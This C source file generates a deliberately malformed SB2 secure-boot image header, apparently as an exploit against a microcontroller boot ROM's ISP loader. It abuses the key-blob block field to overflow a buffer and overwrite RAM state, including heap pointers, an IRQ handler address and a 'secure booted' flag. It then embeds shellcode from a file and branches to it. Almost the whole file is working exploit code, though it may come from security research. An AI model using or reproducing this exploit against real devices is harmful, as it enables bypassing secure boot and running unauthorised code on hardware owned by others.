#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>
#include <sys/stat.h>
#include <errno.h>

typedef uint32_t section_id_t;

struct version_t
{
    uint16_t m_major;
    uint16_t m_pad0;
    uint16_t m_minor;
    uint16_t m_pad1;
    uint16_t m_revision;
    uint16_t m_pad2;
};

typedef struct version_t version_t;

    struct sb2_header_t
    {
        uint32_t nonce[4];            //!< Nonce for AES-CTR
        
        uint32_t reserved;            //!< Reserved, un-used
        uint8_t m_signature[4];       //!< 'STMP', see #ROM_IMAGE_HEADER_SIGNATURE.
        uint8_t m_majorVersion;       //!< Major version for the image format, see #ROM_BOOT_IMAGE_MAJOR_VERSION.
        uint8_t m_minorVersion;       //!< Minor version of the boot image format, see #ROM_BOOT_IMAGE_MINOR_VERSION.
        
        uint16_t m_flags;             //!< Flags or options associated with the entire image.
        uint32_t m_imageBlocks;       //!< Size of entire image in blocks.
        uint32_t m_firstBootTagBlock; //!< Offset from start of file to the first boot tag, in blocks.
        section_id_t m_firstBootableSectionID; //!< ID of section to start booting from.
        
        uint32_t m_offsetToCertificateBlockInBytes;     //! Offset in bytes to the certificate block header for a signed SB file.
        
        uint16_t m_headerBlocks;               //!< Size of this header, including this size word, in blocks.
        
        uint16_t m_keyBlobBlock;      //!< Block number where the key blob starts
        uint16_t m_keyBlobBlockCount; //!< Number of cipher blocks occupied by the key blob. 
        uint16_t m_maxSectionMacCount; //!< Maximum number of HMAC table entries used in all sections of the SB file.
        uint8_t m_signature2[4];      //!< Always set to 'sgtl'
        
        uint64_t m_timestamp;         //!< Timestamp when image was generated in microseconds since 1-1-2000.
        version_t m_productVersion;   //!< User controlled product version.
        version_t m_componentVersion; //!< User controlled component version.
        uint32_t m_buildNumber;          //!< User controlled build number.
        uint8_t m_padding1[4];        //!< Padding to round up to next cipher block.
    };


#define EXTRA_BUFFER_START 0x140015a0

// calculated from where the address after the buffer
#define GLOBAL_ADDR(a) ( ((a) - EXTRA_BUFFER_START) / 4 )

#define COPY_UNTIL 0x14005a50

// This includes 6 for our header
#define NUM_COPY_BLOCKS (6 + ((COPY_UNTIL - EXTRA_BUFFER_START) / 16))

int main() {
	struct sb2_header_t header = { 0 };

	//uint32_t blank[4096/4] = { 0 };
	// This is waaaay more than we need but it gives us space
	uint32_t extra_bytes[1000+0x4000] =  { 0 };
	int in_fd, out_fd, assembly_fd, ret, size;
	struct stat st;

	// Extra data used for sb2 checking?
	header.nonce[0] = 0x00000e8f;
	// Branch target!
	// Remember to set the low bit for thumb mode
	//header.nonce[1] = 0x1301ae71;
	header.nonce[1] = 0x14005a01;
	// Branch to self (just for testing)
	header.nonce[2] = 0xe7fee7fe;
	// Extra 
	header.nonce[3] = 0x44444444;

	// standard
	header.m_signature[0] = 'S';
    	header.m_signature[1] = 'T';
    	header.m_signature[2] = 'M';
    	header.m_signature[3] = 'P';
	header.m_majorVersion = 2;
	header.m_minorVersion = 1;
	// signed and encrypted
	header.m_flags = 0x8;

	// total number of image blocks, needs to account for how much
	// we are sending
	//header.m_imageBlocks = 0x41;
	header.m_imageBlocks = 0x800;

	// Needs to be > than the key blob block
	header.m_firstBootTagBlock = 0x600;

	// set a value for the cet offset
	header.m_offsetToCertificateBlockInBytes = 0x550;
	header.m_headerBlocks = 0x6;

	// Our magic: set this to something unexpected!
	header.m_keyBlobBlock = NUM_COPY_BLOCKS;

	header.m_keyBlobBlockCount = 0x1;
	header.m_maxSectionMacCount = 0x5;

	header.m_signature2[0] = 's';
	header.m_signature2[1] = 'g';
	header.m_signature2[2] = 't';
	header.m_signature2[3] = 'l';

	// Part of this needs to be zero when we copy
	header.m_timestamp = 0x0;

	memset(extra_bytes, 0, sizeof(extra_bytes));

	// This is our target heap
	extra_bytes[GLOBAL_ADDR(0x14001768)] = 0x14001478;

	// Heap size
	extra_bytes[GLOBAL_ADDR(0x1400176c)] = 0x4000;
	// afterwards is heap bytes -- we can't overwrite this!

	// 0x14001770
	extra_bytes[GLOBAL_ADDR(0x14001774)] = 0x1;
	extra_bytes[GLOBAL_ADDR(0x14001778)] = 0x14003434;
	extra_bytes[GLOBAL_ADDR(0x1400177c)] = 0x8;

	// 0x14001780
	extra_bytes[GLOBAL_ADDR(0x14001780)] = 0x14003434;
	// I suspect this is key:
	// Number of bytes left for ISP!
	extra_bytes[GLOBAL_ADDR(0x14001784)] = 0x10e00;

	// 0x14001790
	// This looks like flash page size
	extra_bytes[GLOBAL_ADDR(0x14001790)] = 0x200;
	// Possibly the ISP command number
	extra_bytes[GLOBAL_ADDR(0x14001794)] = 0x8;

	// 0x140017a0
	extra_bytes[GLOBAL_ADDR(0x140017a4)] = 0x130013a0;
	extra_bytes[GLOBAL_ADDR(0x140017a8)] = 0x6b088563;

	// Flexcomm state
	// Flexcomm IRQ handler
	extra_bytes[GLOBAL_ADDR(0x14002aac)] = 0x13019bef;

	// Some kind of timer constant
	extra_bytes[GLOBAL_ADDR(0x14003308)] = 0x30;

	// ISP state?
	extra_bytes[GLOBAL_ADDR(0x1400387c)] = 0x12;
	extra_bytes[GLOBAL_ADDR(0x14003880)] = 0x12;
	extra_bytes[GLOBAL_ADDR(0x14003884)] = 0x101;

	// Marks us as secure booted
	extra_bytes[GLOBAL_ADDR(0x1400389c)] = 0x5aa55aa5;

	// DMA state
	extra_bytes[GLOBAL_ADDR(0x14002ab8)] = 0x14002620;
	extra_bytes[GLOBAL_ADDR(0x14002abc)] = 0x14002610;
	extra_bytes[GLOBAL_ADDR(0x14002c28)] = 0x7;
	extra_bytes[GLOBAL_ADDR(0x14002c34)] = 0xFF;
	extra_bytes[GLOBAL_ADDR(0x14002c78)] = 0x5009f000;
	extra_bytes[GLOBAL_ADDR(0x14002c7c)] = 0x14002630;
	extra_bytes[GLOBAL_ADDR(0x14002cc0)] = 0x070effff;
	extra_bytes[GLOBAL_ADDR(0x14002cc4)] = 0x070effff;

	extra_bytes[GLOBAL_ADDR(0x14003d50)] = 0x01000106;


	// misc ISP state
	extra_bytes[GLOBAL_ADDR(0x14005028)] = 0x13013f7d;

	extra_bytes[GLOBAL_ADDR(0x14005030)] = 0x14001774;


	extra_bytes[GLOBAL_ADDR(0x14005040)] = 0x13002268;
	extra_bytes[GLOBAL_ADDR(0x14005044)] = 0x14005024;
	extra_bytes[GLOBAL_ADDR(0x14005048)] = 0x130011a8;
	extra_bytes[GLOBAL_ADDR(0x1400504c)] = 0x13002190;

	extra_bytes[GLOBAL_ADDR(0x14005050)] = 0x13002190;
	extra_bytes[GLOBAL_ADDR(0x14005054)] = 0x140019b0;

	extra_bytes[GLOBAL_ADDR(0x14005120)] = 0xc3c3000;
	extra_bytes[GLOBAL_ADDR(0x14005124)] = 0;
	extra_bytes[GLOBAL_ADDR(0x14005128)] = 0x9ddff;
	extra_bytes[GLOBAL_ADDR(0x1400512c)] = 0x1;

	extra_bytes[GLOBAL_ADDR(0x14005130)] = 0x0;
	extra_bytes[GLOBAL_ADDR(0x14005134)] = 0x130018b0;
	extra_bytes[GLOBAL_ADDR(0x14005138)] = 0x10000000;
	extra_bytes[GLOBAL_ADDR(0x1400513c)] = 0x1009ddff;

	extra_bytes[GLOBAL_ADDR(0x14005140)] = 0x101;
	extra_bytes[GLOBAL_ADDR(0x14005144)] = 0x0;
	extra_bytes[GLOBAL_ADDR(0x14005148)] = 0x130018b0;
	extra_bytes[GLOBAL_ADDR(0x1400514c)] = 0x0009de00;

	extra_bytes[GLOBAL_ADDR(0x14005150)] = 0x0009ffff;
	extra_bytes[GLOBAL_ADDR(0x14005154)] = 0x0;
	extra_bytes[GLOBAL_ADDR(0x14005158)] = 0x5;
	extra_bytes[GLOBAL_ADDR(0x1400515c)] = 0x130018d0;

	extra_bytes[GLOBAL_ADDR(0x14005160)] = 0x20000000;
	extra_bytes[GLOBAL_ADDR(0x14005164)] = 0x2003ffff;
	extra_bytes[GLOBAL_ADDR(0x14005168)] = 0x11;
	extra_bytes[GLOBAL_ADDR(0x1400516c)] = 0x0;

	extra_bytes[GLOBAL_ADDR(0x14005170)] = 0x13001ff4;
	extra_bytes[GLOBAL_ADDR(0x14005174)] = 0x30000000;
	extra_bytes[GLOBAL_ADDR(0x14005178)] = 0x3003ffff;
	extra_bytes[GLOBAL_ADDR(0x1400517c)] = 0x00000111;

	extra_bytes[GLOBAL_ADDR(0x14005180)] = 0x0;
	extra_bytes[GLOBAL_ADDR(0x14005184)] = 0x13001ff4;
	extra_bytes[GLOBAL_ADDR(0x14005188)] = 0x04000000;
	extra_bytes[GLOBAL_ADDR(0x1400518c)] = 0x0403ffff;

	extra_bytes[GLOBAL_ADDR(0x14005190)] = 0x00000011;
	extra_bytes[GLOBAL_ADDR(0x14005194)] = 0x0;
	extra_bytes[GLOBAL_ADDR(0x14005198)] = 0x13001ff4;
	extra_bytes[GLOBAL_ADDR(0x1400519c)] = 0x14000000;

	extra_bytes[GLOBAL_ADDR(0x140051a0)] = 0x1403ffff;
	extra_bytes[GLOBAL_ADDR(0x140051a4)] = 0x111;
	extra_bytes[GLOBAL_ADDR(0x140051a8)] = 0x0;
	extra_bytes[GLOBAL_ADDR(0x140051ac)] = 0x13001ff4;

	extra_bytes[GLOBAL_ADDR(0x140051ec)] = 0x14;

	// Hmm our address...
	extra_bytes[GLOBAL_ADDR(0x14005224)] = 0x50086000;



	in_fd = open("assembly.bin", O_RDONLY);

	if (in_fd < 0) {
		printf("failed to open assembly");
		exit(1);
	}

	
	fstat(in_fd, &st);
	size = st.st_size;


	// Canary for testing
	//extra_bytes[GLOBAL_ADDR(COPY_UNTIL-4)] = 0x44444444;
	//extra_bytes[GLOBAL_ADDR(COPY_UNTIL-8)] = 0x44444444;
	//extra_bytes[GLOBAL_ADDR(COPY_UNTIL-0xc)] = 0xbbbbbbbb;
	//extra_bytes[GLOBAL_ADDR(COPY_UNTIL-0x10)] = 0x77777777;

	extra_bytes[GLOBAL_ADDR(0x14005918)] = 0x34343434;


	ret = read(in_fd, &extra_bytes[GLOBAL_ADDR(0x14005a00)], size);
	
	if (ret < 0) {
		printf("failed to read");
		exit(1);
	}

	printf("read %d\n", ret);
	out_fd = open("/tmp/bad_header.bin", O_WRONLY | O_CREAT, 0666);

	if (out_fd < 0) {
		printf("failed to open %s \n", strerror(errno));
		exit(-1);
	}

	write(out_fd, (void *) &header, sizeof(header));

	write(out_fd, (void *)extra_bytes, sizeof(extra_bytes));

	close(out_fd);

	printf("Done.\n");
	 
}
